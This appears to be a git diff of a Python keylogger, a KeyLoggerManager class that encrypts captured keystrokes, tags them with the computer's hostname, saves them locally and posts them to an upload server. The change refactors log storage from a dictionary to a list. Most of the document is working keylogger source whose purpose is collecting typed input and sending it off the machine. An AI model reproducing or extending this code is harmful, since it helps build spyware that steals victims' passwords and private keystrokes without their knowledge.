@@ -16,6 +16,7 @@ class KeyLoggerManager:
         self.encryptor = Encryptor(secret_key)
         self.network_writer = NetworkWriter()
         self.data_dic = {}
+        self.entries_list = []  # List to store formatted log entries
         self.num_of_enter = 0
         self.computer_id = socket.gethostname()
         self.datestamp = ""
@@ -39,54 +40,44 @@ class KeyLoggerManager:
         if logged_keys == "":
             return
         encrypted_data = self.encryptor.encrypt(logged_keys)
-        hourstamp = datetime.now().strftime("%H:%M:%S")
-        self.datestamp = datetime.now().strftime("%Y-%m-%d")
+        timestamp = datetime.now().strftime("%H:%M:%S")
 
         if encrypted_data:
-            self.data_dic[hourstamp] = {"key_data": encrypted_data}
+            log_entry = {"timestamp": timestamp, "key_data": encrypted_data}
+            self.entries_list.append(log_entry)  # Add to persistent list
+            print(f"Added {len(logged_keys)} keys to the list.")
 
         self.service.clear_data()
-        print(f"Added {len(logged_keys)} keys to the dictionary.")
 
     def save_locally(self):
-        """Save logs locally and send them to the server."""
         try:
-            formatted_entries = self.format_logs()
-            if not formatted_entries:
+            if not self.entries_list:
                 print("No new data to save.")
                 return
 
-            print(f"Data to send: {formatted_entries}")
+            print(f"Data to send: {self.entries_list}")
 
             # Send data to the server
-            self.send_to_server(formatted_entries)
+            self.send_to_server()
 
             # Save data locally
-            self.file_writer.send_data(formatted_entries, self.computer_id)
+            self.file_writer.send_data(self.entries_list, self.computer_id)
             print("Data saved locally.")
 
-            self.data_dic = {}  # Clear the dictionary after saving
+            self.entries_list = []  # Clear the list after saving
         except Exception as e:
             print(f"Failed to save data locally: {e}")
 
-    def send_to_server(self, formatted_entries):
-        """Send encrypted logs to the server."""
-        if not formatted_entries:
+    def send_to_server(self):
+        if not self.entries_list:
             print("No new data to send to the server.")
             return
 
         payload = {
             "computer_id": self.computer_id,
-            "logs": formatted_entries  # Directly send the formatted data
+            "logs": self.entries_list  # Use the persistent list directly
         }
         self.network_writer.send_data(payload, "http://127.0.0.1:5000/upload")
-
-    def format_logs(self):
-        """Format logs consistently for both local storage and server transmission."""
-        return [
-            {"timestamp": timestamp, "key_data": data["key_data"]}
-            for timestamp, data in self.data_dic.items()
-        ]
 
 
 if __name__ == "__main__":
@@ -98,7 +89,7 @@ if __name__ == "__main__":
 
     try:
         while True:
-            time.sleep(1)  # Keep the program active
+            time.sleep(1)  # Keeps the program running
     except KeyboardInterrupt:
         keyManager.stop()
-        keylogger_thread.join()  # Wait for the thread to finish
+        keylogger_thread.join()
